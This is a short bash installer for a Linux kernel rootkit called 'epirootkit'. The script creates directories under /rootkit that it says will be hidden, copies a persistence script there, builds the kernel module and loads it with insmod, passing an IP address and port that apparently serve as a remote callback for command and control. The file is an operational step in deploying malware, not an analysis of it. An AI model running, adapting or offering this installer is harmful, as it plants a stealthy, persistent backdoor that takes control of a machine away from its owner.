#!/usr/bin/env bash

set -euo pipefail

ip="192.168.1.53" # My local IP, overwrite this
port="6667" # Default port

if (( $# > 2 )); then
  echo "Usage: $0 [ip] [port]"
  exit 1
fi

if (( $# >= 1 )); then
    ip="$1"
fi

if (( $# >= 2 )); then
    port="$2"
fi

echo "Creating rootkit's directories (will be hidden)"
sudo mkdir -p /rootkit/uploaded
sudo mkdir -p /rootkit/persist
sudo cp ./persist.sh /rootkit/persist

echo "Building..."
make -B 2>/dev/null

sudo cp ./epirootkit.ko /rootkit/persist

echo "Inserting.."
sudo insmod ./epirootkit.ko ip="$ip" port="$port"

echo "Done"
